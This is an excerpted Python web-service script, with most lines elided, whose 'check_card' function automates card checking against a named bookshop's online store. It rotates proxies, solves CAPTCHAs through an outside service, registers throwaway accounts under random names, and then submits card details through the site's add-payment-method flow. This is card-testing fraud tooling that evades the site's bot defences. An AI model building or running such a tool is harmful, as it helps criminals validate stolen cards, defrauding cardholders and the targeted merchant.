...
def get_current_time():
    now = datetime.now()
    return now.strftime('%Y-%m-%d+%H%%3A%M%%3A%S')
...
def solve_captcha(proxy_url):
    ...
    response = requests.post(url, data=payload, headers=headers_captcha, proxies=proxies)
    ...
    for attempt in range(max_attempts):
        ...
        response = requests.get(poll_url, params=params, headers=headers_captcha, proxies=proxies)
...
def check_card():
    ...
    try:
        ...
        proxy_url = parse_proxy(proxy_string) if proxy_string else None
        proxies = {"http": proxy_url, "https": proxy_url} if proxy_url else None
        ...
        first_names = ['James', 'Smith', 'Johnson', 'Williams', 'Brown', 'Jones', 'Davis', 'Miller', 'Wilson', 'Moore']
        ...
        token = solve_captcha(proxy_url)
        if not token:
            return jsonify({'status': 'error', 'message': 'Failed to solve CAPTCHA'}), 200
        ...
        response = session.get('https://www.windhorsepublications.com/my-account/', headers=headers1, proxies=proxies, timeout=30)
        html = response.text
        ...
        response = session.post('https://www.windhorsepublications.com/my-account/', headers=headers2, data=data, proxies=proxies, timeout=30)
        ...
        response = session.get('https://www.windhorsepublications.com/my-account/lost-password/', params=params, headers=headers3, proxies=proxies, timeout=30)
        html = response.text
        ...
        response = session.post('https://www.windhorsepublications.com/my-account/lost-password/', params=params2, headers=headers4, data=data2, proxies=proxies, timeout=30)
        ...
        response = session.get('https://www.windhorsepublications.com/my-account/edit-address/billing', headers=headers5, proxies=proxies, timeout=30)
        html = response.text
        ...
        response = session.post('https://www.windhorsepublications.com/my-account/edit-address/billing/', headers=headers6, data=data3, proxies=proxies, timeout=30)
        ...
        response = session.get('https://www.windhorsepublications.com/my-account/add-payment-method/', headers=headers7, proxies=proxies, timeout=30)
        html = response.text
        ...
        response = session.post('https://www.windhorsepublications.com/wp-admin/admin-ajax.php', data=payload, headers=headers8, proxies=proxies, timeout=30)
        result = response.json()
        ...
        response = session.post('https://www.windhorsepublications.com/my-account/add-payment-method/', headers=headers10, data=payment_data, proxies=proxies, timeout=30)
        html = response.text
